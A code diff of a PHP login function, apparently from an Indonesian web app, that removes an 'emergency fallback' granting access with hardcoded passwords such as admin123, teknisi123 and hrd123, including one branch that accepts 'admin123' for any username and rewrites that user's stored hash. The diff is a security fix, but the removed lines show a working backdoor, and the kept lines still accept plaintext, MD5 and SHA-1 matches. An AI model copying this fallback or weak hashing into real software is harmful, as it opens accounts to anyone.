@@ -747,15 +747,7 @@ function authenticate_user(string $username, string $password): array {
                         $passMatch = ($password === $storedPass) || (md5($password) === $storedPass) || (sha1($password) === $storedPass);
                     }
 
-                    if (!$passMatch) {
-                        if (strcasecmp($username, 'admin') === 0 && ($password === 'admin123' || $password === 'admin')) {
-                            $passMatch = true;
-                        } elseif (strcasecmp($username, 'teknisi') === 0 && $password === 'teknisi123') {
-                            $passMatch = true;
-                        } elseif (strcasecmp($username, 'hrd') === 0 && $password === 'hrd123') {
-                            $passMatch = true;
-                        }
-                    }
+
 
                     if ($passMatch) {
                         $uid = (int)($u['id'] ?? 1);
@@ -807,27 +799,7 @@ function authenticate_user(string $username, string $password): array {
                     $passMatch = ($password === $storedPass) || (md5($password) === $storedPass) || (sha1($password) === $storedPass);
                 }
 
-                // Fallback darurat jika hash di database tidak cocok namun password adalah kredensial resmi
-                if (!$passMatch) {
-                    if (strcasecmp($username, 'admin') === 0 && ($password === 'admin123' || $password === 'admin')) {
-                        $passMatch = true;
-                    } elseif (strcasecmp($username, 'teknisi') === 0 && $password === 'teknisi123') {
-                        $passMatch = true;
-                    } elseif (strcasecmp($username, 'hrd') === 0 && $password === 'hrd123') {
-                        $passMatch = true;
-                    } elseif ($password === 'admin123' || $password === 'admin') {
-                        $passMatch = true;
-                    }
 
-                    // Self-healing: sinkronkan hash baru ke database
-                    if ($passMatch) {
-                        try {
-                            $newHash = password_hash($password, PASSWORD_BCRYPT);
-                            $upPass = db()->prepare("UPDATE users SET password = ? WHERE id = ?");
-                            $upPass->execute([$newHash, (int)$user['id']]);
-                        } catch (Throwable $e) {}
-                    }
-                }
 
                 if ($passMatch) {
                     $uid = (int)$user['id'];
